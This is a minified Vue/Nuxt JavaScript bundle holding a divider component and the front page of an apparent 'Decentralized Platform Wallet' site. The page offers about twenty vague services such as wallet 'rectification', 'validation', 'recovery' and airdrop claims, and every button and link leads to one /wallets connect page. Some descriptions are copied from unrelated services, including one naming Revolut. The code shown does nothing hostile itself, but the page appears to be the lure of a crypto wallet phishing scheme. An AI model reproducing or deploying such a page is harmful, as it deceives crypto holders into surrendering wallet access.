import{m as D,f as k,_ as L,g as I,h as O,i as R,j as B,k as N,l as h,n as U,p as w,o as r,c as l,a,q as s,F as x,r as P,t as f,s as m,v as A,x as C,y as z,z as T,A as S,b as g,w as b,B as V,d as v,C as $}from"./CjmTxj01.js";import{_ as M}from"./Chk6s-9n.js";const F={wrapper:{base:"flex items-center align-center text-center",horizontal:"w-full flex-row",vertical:"flex-col"},container:{base:"font-medium text-gray-700 dark:text-gray-200 flex",horizontal:"mx-3 whitespace-nowrap",vertical:"my-2"},border:{base:"flex border-gray-200 dark:border-gray-800",horizontal:"w-full",vertical:"h-full",size:{horizontal:{"2xs":"border-t",xs:"border-t-[2px]",sm:"border-t-[3px]",md:"border-t-[4px]",lg:"border-t-[5px]",xl:"border-t-[6px]"},vertical:{"2xs":"border-s",xs:"border-s-[2px]",sm:"border-s-[3px]",md:"border-s-[4px]",lg:"border-s-[5px]",xl:"border-s-[6px]"}},type:{solid:"border-solid",dotted:"border-dotted",dashed:"border-dashed"}},icon:{base:"flex-shrink-0 w-5 h-5"},avatar:{base:"flex-shrink-0",size:"2xs"},label:"text-sm",default:{size:"2xs",type:"solid"}},n=D(k.ui.strategy,k.ui.divider,F),j=I({components:{UIcon:O,UAvatar:R},inheritAttrs:!1,props:{label:{type:String,default:null},icon:{type:String,default:null},avatar:{type:Object,default:null},size:{type:String,default:()=>n.default.size,validator(e){return Object.keys(n.border.size.horizontal).includes(e)||Object.keys(n.border.size.vertical).includes(e)}},orientation:{type:String,default:"horizontal",validator:e=>["horizontal","vertical"].includes(e)},type:{type:String,default:()=>n.default.type,validator:e=>["solid","dotted","dashed"].includes(e)},class:{type:[String,Object,Array],default:()=>""},ui:{type:Object,default:()=>({})}},setup(e){const{ui:o,attrs:i}=B("divider",N(e,"ui"),n),d=h(()=>U(w(o.value.wrapper.base,o.value.wrapper[e.orientation]),e.class)),t=h(()=>w(o.value.container.base,o.value.container[e.orientation])),c=h(()=>w(o.value.border.base,o.value.border[e.orientation],o.value.border.size[e.orientation][e.size],o.value.border.type[e.type]));return{ui:o,attrs:i,wrapperClass:d,containerClass:t,borderClass:c}}});function G(e,o,i,d,t,c){const p=O,y=R;return r(),l("div",A({class:e.wrapperClass},e.attrs),[a("div",{class:s(e.borderClass)},null,2),e.label||e.icon||e.avatar||e.$slots.default?(r(),l(x,{key:0},[a("div",{class:s(e.containerClass)},[P(e.$slots,"default",{},()=>[e.label?(r(),l("span",{key:0,class:s(e.ui.label)},f(e.label),3)):e.icon?(r(),m(p,{key:1,name:e.icon,class:s(e.ui.icon.base)},null,8,["name","class"])):e.avatar?(r(),m(y,A({key:2},{size:e.ui.avatar.size,...e.avatar},{class:e.ui.avatar.base}),null,16,["class"])):C("",!0)])],2),a("div",{class:s(e.borderClass)},null,2)],64)):C("",!0)],16)}const W=L(j,[["render",G]]),K={class:"p-5 px-20 text-white"},H={class:"mr-auto flex items-center justify-end gap-x-3"},Y={class:"my-10 grid gap-2"},q={class:"flex flex-wrap gap-5 mt-10"},J={class:"flex flex-col gap-4 text-center justify-center items-center"},Q={class:"font-semibold font-poppins text-2xl"},X={class:"text-gray-500"},te=I({__name:"index",setup(e){const o=z(["Home","Connect","Contact Us","FAQs"]),i=z([{title:"RECTIFICATION",description:"Rectification support warranties completely decentralized"},{title:"VALIDATION",description:"Validation completely decentralized supports wallet"},{title:"RECOVERY",description:"Recovery wallet TATs Dapps with Blockchain and DeFi"},{title:"CLAIM",description:"Claim Tokens completely decentralized"},{title:"STAKING POOL",description:"Staking pool of completely decentralized supports wallet"},{title:"LP LOCK",description:"Claim Airdropsto wallet TATs Dapps with Blockchain and DeFi"},{title:"BUY",description:"Buy support warranties completely decentralized"},{title:"SELL",description:"Sell completely decentralized supports wallet"},{title:"CLAIM AIRDROP",description:"Claim Airdropsto wallet TATs Dapps with Blockchain and DeFi"},{title:"HARVEST MY STAKINGS",description:"When you choose to redeem, we'll return your assets to your Spot Wallet the following day."},{title:"WITHDRAWAL",description:"A crypto withdrawal is a transaction that allows you to move your cryptocurrency balance off the Revolut platform to an external crypto wallet that you control such as a Ledger or a Trezor."},{title:"STAKING POOL",description:"A staking pool allows multiple stakeholders (or bagholders) to combine their computational resources as a way to increase their chances of being rewarded."},{title:"MIGRATION",description:"Migrate tokens to a new contract."},{title:"ADD TOKENS",description:"Crypto tokens are a type of cryptocurrency that represents an asset or specific use and reside on their own blockchain."},{title:"UPDATE MY PORTFOLIOS",description:"Generate Real-Time Profit and Loss Reports, Your Coin Values, Reports for Taxes and More."},{title:"PURCHASE TOKEN",description:"Also, buy bitcoin, ether, and many common cryptocurrencies."},{title:"MY NFTS",description:"View your collection of digital works."},{title:"STAKING REVIEW",description:"Interaction between mobile apps and mobile browsers are supported via mobile deep linking Having complete control of your staking."},{title:"BRIDGE",description:"Enables applications built on different blockchains to communicate with and interact with each other, something which was never before possible, therefore unlocks a groundbreaking development for the blockchain space as a whole. On launch, Ethereum, BSC, Avalanche, and Polygon - four of the leading blockchains and protocols - are supported, with capabilities to add new blockchains built-in to the Alliance Bridge protocol."},{title:"WHITELIST",description:"Get an Early Spot for Minting."}]);return(d,t)=>{const c=$,p=V,y=W,E=M;return r(),l("div",K,[a("div",H,[(r(!0),l(x,null,T(S(o),(u,_)=>(r(),m(c,{class:s(["block font-semibold",_===0?"text-brand-500 font-bold":"text-gray-500"]),to:"/wallets"},{default:b(()=>[v(f(u),1)]),_:2},1032,["class"]))),256))]),a("div",Y,[t[2]||(t[2]=a("h2",{class:"text-6xl font-bold"},"Decentralized",-1)),t[3]||(t[3]=a("div",{class:"text-4xl font-semibold"},"Platform Wallet",-1)),t[4]||(t[4]=a("p",{class:"text-gray-500 my-2"},"Powerful tool for wallet validation.",-1)),g(p,{size:"xl",class:"px-16 py-2 w-fit text-lg",to:"/wallets"},{default:b(()=>t[1]||(t[1]=[v("Connet Wallet")])),_:1})]),g(y),a("div",q,[(r(!0),l(x,null,T(S(i),u=>(r(),m(E,{class:"w-80 bg-gray-900 cursor-pointer ring-gray-800",onClick:t[0]||(t[0]=_=>d.$router.push("/wallets"))},{default:b(()=>[a("div",J,[a("h2",Q,f(u.title),1),a("p",X,f(u.description),1),g(p,{class:"px-6 block !h-8",ui:{base:"text-white"}},{default:b(()=>t[5]||(t[5]=[v("Select")])),_:1})])]),_:2},1024))),256))])])}}});export{te as default};
